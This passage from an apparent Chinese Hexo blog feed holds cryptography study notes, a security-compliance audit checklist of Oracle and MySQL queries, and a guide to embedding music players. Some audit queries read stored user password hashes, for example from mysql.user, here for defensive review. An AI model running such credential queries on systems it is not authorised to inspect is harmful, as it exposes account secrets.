title="基于hash函数的消息认证码(HMAC)"></a>基于hash函数的消息认证码(HMAC)</h4><p>带密钥的Hash函数构造方案<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-13-21-37-09.png" alt="HMAC" title="" class="">                <p>HMAC</p>            </figure></p><h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-13-21-41-52.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-13-21-43-06.png" alt="例题2" title="" class="">                <p>例题2</p>            </figure><p><br><br><br></p><h1 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><ul><li>密钥管理包括密钥的产生、存储、分配、组织、使用、更换、销毁等一系列技术问题。</li></ul><h2 id="对称密码的密钥管理"><a href="#对称密码的密钥管理" class="headerlink" title="对称密码的密钥管理"></a>对称密码的密钥管理</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-13-21-44-34.png" alt="对称密码的密钥管理" title="" class="">                <p>对称密码的密钥管理</p>            </figure><h2 id="非对称密码的密钥管理"><a href="#非对称密码的密钥管理" class="headerlink" title="非对称密码的密钥管理"></a>非对称密码的密钥管理</h2><h3 id="公约基础设施PKI"><a href="#公约基础设施PKI" class="headerlink" title="公约基础设施PKI"></a>公约基础设施PKI</h3><ul><li><strong>签证机构CA</strong>：负责签发证书，管理和撤销证书</li><li><strong>注册机构RA</strong>：专门负责受理用户申请证书的机构</li><li><strong>证书的签发</strong>：CA签发<br>  <strong>CA签发过程</strong>：<ol><li>用户向CA提交RA的注册批准信息及自己的身份等信息(或由RA向CA提交)；</li><li>CA验证所提交信息的正确性和真实性；</li><li>CA为用户产生密钥(或由用户自己产生并提供密钥)，并进行备份；</li><li>CA生成证书，并施加签名；</li><li>将证书的一个副本交给用户，并存档入库。</li></ol></li><li>证书目录</li><li>证书的认证</li><li>证书的撤销</li><li>信任模型</li></ul><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
            <tag> DES </tag>
            
            <tag> SM4 </tag>
            
            <tag> RC4 </tag>
            
            <tag> SHA </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SqlDJBH</title>
      <link href="/2019/03/26/SqlDJBH/"/>
      <url>/2019/03/26/SqlDJBH/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>数据库等级保护笔记2.0</p></blockquote><a id="more"></a><h1 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h1><h2 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h2><figure class="highlight sql"><figcaption><span>oracle</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> v$<span class="keyword">version</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span> <span class="keyword">from</span> v$<span class="keyword">instance</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span> <span class="keyword">FROM</span> Product_component_version <span class="keyword">Where</span> <span class="keyword">SUBSTR</span>(PRODUCT,<span class="number">1</span>,<span class="number">6</span>)=<span class="string">'Oracle'</span>;</span><br></pre></td></tr></table></figure><h2 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h2><h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><p>Oracle默认提供了一个密码策略的sql执行文件<code>utlpwdmg.sql</code><br><figure class="highlight"><figcaption><span>oracle</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">$ORACLE_HOME/rdbms/admin/utlpwdmg.sql #默认位置</span><br><span class="line"># Windows</span><br><span class="line"># windows路径位置可以通过搜索来获得。</span><br><span class="line">C:\app\Administrator\product\11.2.0\dbhome_1\RDBMS\ADMIN #默认位置</span><br><span class="line"></span><br><span class="line"># 查看用户状态及profile文件</span><br><span class="line"><span class="keyword">select</span> username,account_status,profile <span class="keyword">from</span> dba_users;</span><br><span class="line"># 只查看激活的用户</span><br><span class="line"><span class="keyword">select</span> username,account_status,profile <span class="keyword">from</span> dba_users <span class="keyword">where</span> account_status=<span class="string">'OPEN'</span>; </span><br><span class="line"></span><br><span class="line"># profile设置</span><br><span class="line"><span class="keyword">select</span> profile,resource_name,<span class="keyword">limit</span> <span class="keyword">from</span> dba_profiles <span class="keyword">where</span> resource_type=<span class="string">'PASSWORD'</span>;</span><br><span class="line">select profile,resource_name,limit from dba_profiles where resource_type='PASSWORD' and profile='DEFAULT'; #只查看默认profile</span><br><span class="line"># 参数</span><br><span class="line">PASSWORD_VERIFY_FUNCTION #复杂度设置，一般为null。</span><br><span class="line">PASSWORD_LIFE_TIME       #口令有效期，默认为180。</span><br><span class="line">PASSWORD_REUSE_TIME      #使用过口令多久可以再次被使用，默认为UNLIMITED。</span><br><span class="line">PASSWORD_REUSE_MAX       #口令被修改后原有口令被修改多少次才允许被重新使用，默认为UNLIMITED。</span><br><span class="line">PASSWORD_GRACE_TIME      #表示用户口令使用时间超过其生命周期后，可以延续使用的天数，并且可延续时间内登录会有相应口令即将过期的提示，默认为7天。</span><br><span class="line">FAILED_LOGIN_ATTEMPTS    #登录失败次数，默认为10。</span><br><span class="line">PASSWORD_LOCK_TIME       #账户锁定时间，默认为1。</span><br></pre></td></tr></table></figure></p><h3 id="超时锁定"><a href="#超时锁定" class="headerlink" title="超时锁定"></a>超时锁定</h3><figure class="highlight sql"><figcaption><span>oracle</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看idle_time设置，默认为UNLIMITED。</span><br><span class="line"><span class="keyword">select</span> resource_name,<span class="keyword">limit</span> <span class="keyword">from</span> dba_profiles <span class="keyword">where</span> profile=<span class="string">'DEFAULT'</span> <span class="keyword">and</span> resource_type=<span class="string">'KERNEL'</span>;</span><br></pre></td></tr></table></figure><figure class="highlight"><figcaption><span>oracle</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user_users; #查看当前用户</span><br><span class="line">select * from dba_users;  #查看数据库的所有用户</span><br><span class="line">select * from all_users;  #列出当前用户可见的数据库的所有用户</span><br></pre></td></tr></table></figure><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><figure class="highlight sql"><figcaption><span>oracle</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from V$PWFILE_USERS;  #查看哪些用户有sysdba或sysoper系统权限</span><br><span class="line">select * from user_sys_privs;  #查看当前用户系统权限</span><br><span class="line">select * from dba_sys_privs;   #查看所有用户系统权限</span><br><span class="line">select * from role_sys_privs;  #查看角色(只能查看登陆用户拥有的角色)所包含的权限</span><br><span class="line">select * from dba_role_privs;  #查看所有用户的角色</span><br><span class="line">select * from user_role_privs; #查看当前用户的角色</span><br><span class="line">select * from dba_roles;       #查看所有角色</span><br><span class="line">select * from dba_tab_privs;   #查看所有用户对象权限</span><br><span class="line">select * from user_tab_privs;  #查看当前用户对象权限</span><br><span class="line">select * from all_tab_privs;   #查看当前用户可查看用户的对象权限</span><br><span class="line">#查看当前用户的缺省表空间</span><br><span class="line"><span class="keyword">select</span> username,default_tablespace <span class="keyword">from</span> user_users;</span><br></pre></td></tr></table></figure><h2 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h2><figure class="highlight"><figcaption><span>oracle</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show parameter audit;                #查看日志</span><br><span class="line">show parameter audit_sys_operations; #启用对sys用户的审计</span><br><span class="line">show parameter audit_trail;          #日志存放位置，若为os，则保存在系统中，windows系统在事件查看器中。</span><br><span class="line">select * from v$logfile;             #日志文件路径</span><br><span class="line">select * from v$sql;                 #查看最近所作的操作</span><br><span class="line">select * fromv $sqlarea;             #查看最近所作的操作</span><br></pre></td></tr></table></figure><h2 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h2><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><h2 id="查看版本-1"><a href="#查看版本-1" class="headerlink" title="查看版本"></a>查看版本</h2><figure class="highlight sql"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">status;</span><br></pre></td></tr></table></figure><h2 id="身份鉴别-1"><a href="#身份鉴别-1" class="headerlink" title="身份鉴别"></a>身份鉴别</h2><h3 id="密码策略-1"><a href="#密码策略-1" class="headerlink" title="密码策略"></a>密码策略</h3><figure class="highlight sql"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#查看密码策略</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">VARIABLES</span> <span class="keyword">like</span> <span class="string">"%password%"</span>; </span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'validate_password%'</span>; </span><br><span class="line"></span><br><span class="line">#查看用户</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host,<span class="keyword">password</span> <span class="keyword">from</span> mysql.user;</span><br><span class="line"></span><br><span class="line">#查看插件信息</span><br><span class="line"><span class="keyword">show</span> plugins;</span><br></pre></td></tr></table></figure><h2 id="访问控制-1"><a href="#访问控制-1" class="headerlink" title="访问控制"></a>访问控制</h2><figure class="highlight"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show grants for root@localhost; #查看指定用户的权限</span><br><span class="line">show grants;                    #查看当前用户的权限</span><br></pre></td></tr></table></figure><h2 id="安全审计-1"><a href="#安全审计-1" class="headerlink" title="安全审计"></a>安全审计</h2><figure class="highlight sql"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show variables like '%log%'; #查看日志</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%audit%'</span>;</span><br><span class="line"># 参数</span><br><span class="line">错误日志：  -log-err  </span><br><span class="line">查询日志：  -log  </span><br><span class="line">慢查询日志：-log-slow-queries  </span><br><span class="line">更新日志：  -log-<span class="keyword">update</span>  </span><br><span class="line">二进制日志：-<span class="keyword">log</span>-<span class="keyword">bin</span></span><br></pre></td></tr></table></figure><h1 id="资源控制"><a href="#资源控制" class="headerlink" title="资源控制"></a>资源控制</h1><h2 id="地址限制"><a href="#地址限制" class="headerlink" title="地址限制"></a>地址限制</h2><figure class="highlight sql"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> host=<span class="string">'%'</span>;</span><br></pre></td></tr></table></figure><figure class="highlight"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%timeout%'</span>;</span><br><span class="line"># 参数</span><br><span class="line">interactive_timeout #服务器关闭交互式连接前等待活动的秒数，默认值为28800。</span><br><span class="line">wait_timeout        #服务器关闭非交互连接之前等待活动的秒数，默认值为28800。</span><br></pre></td></tr></table></figure><figure class="highlight"><figcaption><span>mysql</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select user();            #查看当前用户</span><br><span class="line">select database();        #查看当前数据库</span><br><span class="line">show database;            #查看所有数据库</span><br><span class="line">show tables;              #显示当前数据库的所有表</span><br><span class="line">select * from mysql.user; #查看所有用户</span><br><span class="line">show plugins;             #查看插件信息</span><br></pre></td></tr></table></figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oracle </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>markdown插入音乐</title>
      <link href="/2019/03/03/markdown%E6%8F%92%E5%85%A5%E9%9F%B3%E4%B9%90/"/>
      <url>/2019/03/03/markdown%E6%8F%92%E5%85%A5%E9%9F%B3%E4%B9%90/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>    <div id="aplayer-kDbmNEFS" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="404465743" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div><blockquote><p>想在博客里插入音乐，折腾了一下午，记录下各种方法</p></blockquote><a id="more"></a><p><br></p><h1 id="音乐平台官方外链方式"><a href="#音乐平台官方外链方式" class="headerlink" title="音乐平台官方外链方式"></a>音乐平台官方外链方式</h1><figure class="highlight html"><figcaption><span>iframe插件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">frameborder</span>=<span class="string">"no"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">marginwidth</span>=<span class="string">"0"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">marginheight</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"//music.163.com/outchain/player?type=2&amp;id=461544312&amp;auto=0&amp;height=66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><figcaption><span>flash插件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"//music.163.com/style/swf/widget.swf?sid=461544312&amp;type=2&amp;auto=0&amp;width=320&amp;height=66"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">width</span>=<span class="string">"340"</span> <span class="attr">height</span>=<span class="string">"86"</span>  <span class="attr">allowNetworking</span>=<span class="string">"all"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>效果</li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=461544312&auto=0&height=66"></iframe><p>缺点:</p><ul><li>之前有版权保护的歌曲可以通过修改id来播放，但是现在不行了，似乎被限制了。</li><li>没有滚动歌词等，功能过于简单</li></ul><h1 id="MeingJS"><a href="#MeingJS" class="headerlink" title="MeingJS"></a>MeingJS</h1><h1 id="加载相关JS文件"><a href="#加载相关JS文件" class="headerlink" title="加载相关JS文件"></a>加载相关JS文件</h1><p>可以在文章开头添加，或者去修改主题<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="在文章中使用"><a href="#在文章中使用" class="headerlink" title="在文章中使用"></a>在文章中使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;aplayer&quot; data-id=&quot;31356499&quot; data-server=&quot;netease&quot; data-type=&quot;song&quot; data-mode=&quot;single&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>主要参数</th><th>值</th></tr></thead><tbody><tr><td>data-id</td><td>歌曲/专辑/歌单 ID</td></tr><tr><td>data-server</td><td>netease（网易云音乐）tencent（QQ音乐） xiami（虾米） kugou（酷狗）</td></tr><tr><td>data-type</td><td>song （单曲） album （专辑） playlist （歌单） search （搜索）</td></tr><tr><td>data-mode</td><td>random （随机） single （单曲） circulation （列表循环） order （列表）</td></tr><tr><td>data-autoplay</td><td>false（手动播放） true（自动播放）</td></tr></tbody></table><ul><li>效果</li></ul><p><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css"></p><p><script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script></p><p><script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script></p><div class="aplayer" data-id="31356499" data-server="netease" data-type="song" data-mode="single"></div><p>缺点：</p><ul><li>修改歌单歌曲并不会使外链变动</li><li>音乐云盘的歌曲（网易没有版权的歌曲）无法播放</li></ul><h1 id="使用Aplay插件"><a href="#使用Aplay插件" class="headerlink" title="使用Aplay插件"></a>使用Aplay插件</h1><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>Audio：<a href="https://github.com/MoePlayer/hexo-tag-aplayer" target="_blank" rel="noopener">hexo-tag-aplayer</a><br><figure class="highlight bash"><figcaption><span>安装插件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-tag-aplayer</span><br></pre></td></tr></table></figure></p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight markdown"><figcaption><span>语法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>title</code> : 曲目标题</li><li><code>author</code>: 曲目作者</li><li><code>url</code>: 音乐文件 URL 地址</li><li><code>picture_url</code>: (可选) 音乐对应的图片地址</li><li><code>narrow</code>: （可选）播放器袖珍风格</li><li><code>autoplay</code>: (可选) 自动播放，移动端浏览器暂时不支持此功能</li><li><code>width</code>:xxx: (可选) 播放器宽度 (默认: 100%)</li><li><code>lrc</code>:xxx: （可选）歌词文件 URL 地址</li></ul></blockquote><p>用来生成外链的地址：<a href="https://music.liuzhijin.cn/" target="_blank" rel="noopener">刘志进实验室</a></p><h2 id="歌词标签"><a href="#歌词标签" class="headerlink" title="歌词标签"></a>歌词标签</h2><p>插入歌词除了用文件，也可以用歌词标签<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayerlrc &quot;title&quot; &quot;author&quot; &quot;url&quot; &quot;autoplay&quot; %&#125;</span><br><span class="line">[00:00.00]lrc here</span><br><span class="line">&#123;% endaplayerlrc %&#125;</span><br></pre></td></tr></table></figure></p><h2 id="播放列表"><a href="#播放列表" class="headerlink" title="播放列表"></a>播放列表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayerlist %&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;narrow&quot;: false,                          // （可选）播放器袖珍风格</span><br><span class="line">    &quot;autoplay&quot;: true,                         // （可选) 自动播放，移动端浏览器暂时不支持此功能</span><br><span class="line">    &quot;mode&quot;: &quot;random&quot;,                         // （可选）曲目循环类型，有 &apos;random&apos;（随机播放）, &apos;single&apos; (单曲播放), &apos;circulation&apos; (循环播放), &apos;order&apos; (列表播放)， 默认：&apos;circulation&apos; </span><br><span class="line">    &quot;showlrc&quot;: 3,                             // （可选）歌词显示配置项，可选项有：1,2,3</span><br><span class="line">    &quot;mutex&quot;: true,                            // （可选）该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</span><br><span class="line">    &quot;theme&quot;: &quot;#e6d0b2&quot;, |                       // （可选）播放器风格色彩设置，默认：#b7daff</span><br><span class="line">    &quot;preload&quot;: &quot;metadata&quot;,                    // （可选）音乐文件预载入模式，可选项： &apos;none&apos; &apos;metadata&apos; &apos;auto&apos;, 默认: &apos;auto&apos;</span><br><span class="line">    &quot;listmaxheight&quot;: &quot;513px&quot;,                 // (可选) 该播放列表的最大长度</span><br><span class="line">    &quot;music&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;CoCo&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;Jeff Williams&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;caffeine.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;caffeine.jpeg&quot;,</span><br><span class="line">            &quot;lrc&quot;: &quot;caffeine.txt&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;アイロニ&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;鹿乃&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;irony.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;irony.jpg&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endaplayerlist %&#125;</span><br></pre></td></tr></table></figure><p>缺点：</p><ul><li>歌曲信息需要自己去手动添加比较麻烦</li></ul><h1 id="MeingJS-支持-3-0-新功能"><a href="#MeingJS-支持-3-0-新功能" class="headerlink" title="MeingJS 支持 (3.0 新功能)"></a>MeingJS 支持 (3.0 新功能)</h1><p>MetingJS 是基于Meting API 的 APlayer 衍生播放器，引入 MetingJS 后，播放器将支持对于 QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。</p><p>在 Hexo 配置文件 _config.yml 中设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: true</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% meting &quot;391125700&quot; &quot;netease&quot; &quot;playlist&quot; &quot;autoplay&quot; &quot;mutex:false&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; &quot;theme:#ad7a86&quot;%&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">默认值</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">必须值</td><td>歌曲 id / 播放列表 id / 相册 id / 搜索关键字</td></tr><tr><td style="text-align:center">server</td><td style="text-align:center">必须值</td><td>音乐平台: netease, tencent, kugou, xiami, baidu</td></tr><tr><td style="text-align:center">type</td><td style="text-align:center">必须值</td><td>song, playlist, album, search, artist</td></tr><tr><td style="text-align:center">fixed</td><td style="text-align:center">false</td><td>开启固定模式</td></tr><tr><td style="text-align:center">mini</td><td style="text-align:center">false</td><td>开启迷你模式</td></tr><tr><td style="text-align:center">loop</td><td style="text-align:center">all</td><td>列表循环模式：all, one,none</td></tr><tr><td style="text-align:center">order</td><td style="text-align:center">list</td><td>列表播放模式： list, random</td></tr><tr><td style="text-align:center">volume</td><td style="text-align:center">0.7</td><td>播放器音量</td></tr><tr><td style="text-align:center">lrctype</td><td style="text-align:center">0</td><td>歌词格式类型</td></tr><tr><td style="text-align:center">listfolded</td><td style="text-align:center">false</td><td>指定音乐播放列表是否折叠</td></tr><tr><td style="text-align:center">storagename</td><td style="text-align:center">metingjs</td><td>LocalStorage 中存储播放器设定的键名</td></tr><tr><td style="text-align:center">autoplay</td><td style="text-align:center">true</td><td>自动播放，移动端浏览器暂时不支持此功能</td></tr><tr><td style="text-align:center">mutex</td><td style="text-align:center">true</td><td>该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td></tr><tr><td style="text-align:center">listmaxheight</td><td style="text-align:center">340px</td><td>播放列表的最大长度</td></tr><tr><td style="text-align:center">preload</td><td style="text-align:center">auto</td><td>音乐文件预载入模式，可选项： none, metadata, auto</td></tr><tr><td style="text-align:center">theme</td><td style="text-align:center">#ad7a86</td><td>播放器风格色彩设置</td></tr></tbody></table><ul><li>效果</li></ul>    <div id="aplayer-WxPVCssT" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="391125700" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="false" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div><p>缺点：</p><ul><li>同样无法更新歌单的问题</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tianma.space/post/3998746934/index.html" target="_blank" rel="noopener">https://tianma.space/post/3998746934/index.html</a><br><a href="https://clearsky.me/hexo-aplayer.html" target="_blank" rel="noopener">https://clearsky.me/hexo-aplayer.html</a><br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Aplay </tag>
            
            <tag> MeingJS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>家用网络设计</title>
      <link href="/2019/02/04/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1/"/>
      <url>/2019/02/04/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1/</url>
